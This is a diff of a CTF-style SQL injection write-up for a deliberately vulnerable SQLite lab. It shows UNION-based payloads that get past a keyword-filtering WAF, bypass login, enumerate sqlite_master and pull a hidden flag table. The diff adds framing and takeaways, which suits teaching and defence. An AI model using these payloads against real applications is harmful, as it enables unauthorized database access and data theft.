@@ -1,19 +1,31 @@
 # Database Reincursion
 
-#### **Vulnerability:** SQL Injection (SQLi)
 
+> This write-up documents a deliberately vulnerable lab / CTF-style environment.  
+> All techniques are presented for educational purposes only.
 
+## Overview
+
+**Database Reincursion** is a SQL Injection write-up focusing on:
+- Authentication bypass under keyword-filtering WAF
+- Result set manipulation to bypass hard `LIMIT` constraints
+- Privilege escalation via inconsistent input validation
+- SQLite-specific metadata abuse
+
+**Techniques:** UNION-based SQLi, logic substitution, metadata enumeration  
+**Database:** SQLite  
+**Difficulty:** Base
 
 ## 1. Authentication Bypass
 
 **Reconnaissance:**
 
-- **Standard payload**: ` or 1=1-- -` triggered a custom error : **Input rejected by security filter.**
+- **Standard payload**: `' or 1=1-- -` triggered a custom error: **Input rejected by security filter.**
 - **Blocked**: The word `or` and `--`.
 
 **Exploitation:**
 
-Sentences triggering filters are ` or ` and ` --` .  
+The security filter blocks the patterns ` or ` and ` --`.
 
 ```sql
 x' union select null,null,null/*
@@ -44,7 +56,7 @@ Kiwi' and Department='Management'/*
 
 **Exploitation:**
 
-1.**Table Discovery:**
+1. **Table Discovery:**
 
 ```sql
  x' union select sql,2,3,4 from sqlite_master/*
@@ -53,10 +65,15 @@ Kiwi' and Department='Management'/*
 
    - Result: Discovered hidden table `CITADEL_ARCHIVE_2077` with column `secrets`.
 
-2.**Flag Retrieval:**
+2. **Flag Retrieval:**
 
 ```sql
 x' union select *,2,3,4 from CITADEL_ARCHIVE_2077/*
 ```
 
+## Key Takeaways
 
+- Keyword-based WAF rules are fragile and easily bypassed
+- Inconsistent filtering across endpoints enables privilege escalation
+- Hard-coded query limits can be bypassed through result filtering
+- SQLite metadata tables (`sqlite_master`) expose critical schema information
